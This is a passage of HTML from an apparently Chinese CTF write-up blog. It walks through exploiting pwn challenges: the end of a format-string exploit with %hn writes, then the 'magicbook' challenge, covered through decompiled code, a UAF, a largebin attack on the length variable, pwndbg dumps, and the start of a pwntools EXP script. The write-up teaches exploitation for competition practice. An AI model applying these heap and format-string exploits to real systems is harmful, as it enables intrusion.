data-num=\"73\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>input1 <span class=\"token operator\">=</span> stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>input2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># [+] input1 ：0xdce8</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\"># [+] input2 ：0xdcea</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hhn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"magicbook\"><a class=\"markdownIt-Anchor\" href=\"#magicbook\">#</a> magicbook</h3>\n<blockquote>\n<p>考察 largebin_attack，orw</p>\n</blockquote>\n<pre><code>Arch: amd64-64-little\nRELRO: Full RELRO\nStack: No canary found\nNX: NX enabled\nPIE: PIE enabled\n该程序是动态连接的\n该程序有符号表可用\n</code></pre>\n<blockquote>\n<p>先申代码</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147418112LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>沙箱比较简单</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"give you a gift: %p\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>给了 elf 中的 d 的真实地址，从而绕过 pie</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>book <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>book<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>book 类型转换，为啥这样呢？往后看就明白了</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">edit_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"come on,Write down your story!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> book<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里往栈上读数据。而长度为 book。但这里我们暂时未知 book 如何怎样一种形式作为长度</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">creat_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rbx</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> book <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"full!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the book index is %d\\n\"</span><span class=\"token punctuation\">,</span> book<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How many pages does your book need?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v0 <span class=\"token operator\">=</span> book<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  p<span class=\"token punctuation\">[</span>v0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token operator\">++</span>book<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这里给出了 book 以 <code>0&lt;count&lt;5</code>  作为长度从 edit 读到栈上，并且 malloc 最大的 size 为 0x500，可以释放进 largebin 内。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">delete_the_book</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"which book would you want to delete?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 判断数量</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Do you want to say anything else before being deleted?(y/n)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> d <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">89</span> <span class=\"token operator\">||</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">121</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"which page do you want to write?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%u\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>p <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token operator\">--</span>d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 无所谓</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显的 uaf，且从 userdata [1] 开始写，所以释放之后你可以直接去修改 fdnextsize 或 bknextsize。算是人性化的题目</p>\n<blockquote>\n<p>好了。代码整体分析了一遍了。如何去攻打捏</p>\n<p>大家可能都被 heap 的第一想法给耽误了如何去做这个题，house？如何泄露 libc？</p>\n<p>其实有时候不要光去用 house 去打 heap，这题用到为 largebin attack 修改 size</p>\n</blockquote>\n<blockquote>\n<p>为了题目为何这样打，先去了解一下 large bin 的性质。</p>\n</blockquote>\n<p>large bin 是一个双向链表，不同之前的 small bin 和 unsorted bin，它多了 fd_nextsize 和 bk_nextsize</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1 chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2 chunk2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  chunk0 進入 unsortedbin</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk3 chunk1 進入 largebin    </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>book <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4050</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>book <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 釋放 chunk2, 進入 unsortedbin 內，同時 uaf 修改 chunk0 的 bk 指針，指向目的地址</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># &lt;large bin attack>,chunk2 插入 largebin 內，同時覆蓋地址 chunk1->bknextsize->fdnextsize 指向 chunk2</span></pre></td></tr></table></figure><p>上面就是 largebin 具体攻击，通过修改 fdnextsize，将 name 修改的特别大</p>\n<blockquote>\n<p>before large bin attack</p>\n<p>pwndbg&gt; x/20gx 0x555555558050-0x20<br>\n0x555555558030 &lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1aaa0\t0x0000000000000000<br>\n0x555555558040 &lt;stderr@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1b6a0\t0x0000000000000000<br>\n0x555555558050 <book>:\t0x0000000000000004\t0x0000000000000000<br>\n0x555555558060 <p>:\t0x000055555555d0c0\t0x000055555555d5a0<br>\n0x555555558070 &lt;p+16&gt;:\t0x000055555555d5e0\t0x000055555555daa0<br>\n0x555555558080 &lt;p+32&gt;:\t0x0000000000000000\t0x000055555555cfb0<br>\n0x555555558090 &lt;p+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580a0 &lt;p+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580b0 &lt;p+80&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580c0 &lt;p+96&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n<p>atfte  large bin attack</p>\n<p>0x555555558030 &lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1aaa0\t0x0000000000000000<br>\n0x555555558040 &lt;stderr@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1b6a0\t0x0000000000000000<br>\n0x555555558050 <book>:\t0x000055555555d5d1\t0x0000000000000000<br>\n0x555555558060 <p>:\t0x000055555555d0c0\t0x000055555555d5a0<br>\n0x555555558070 &lt;p+16&gt;:\t0x000055555555d5e0\t0x000055555555daa0<br>\n0x555555558080 &lt;p+32&gt;:\t0x000055555555dfb0\t0x000055555555cfb0<br>\n0x555555558090 &lt;p+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580a0 &lt;p+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580b0 &lt;p+80&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580c0 &lt;p+96&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>可见那个数字修改成 <code>0x000055555555d5d1</code> ，为啥后面会多个 1，不用问，他的代码就是 <code>book++</code></p>\n<p>之后就是 edit 哪里的栈溢出攻击</p>\n<h4 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> EXP</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td 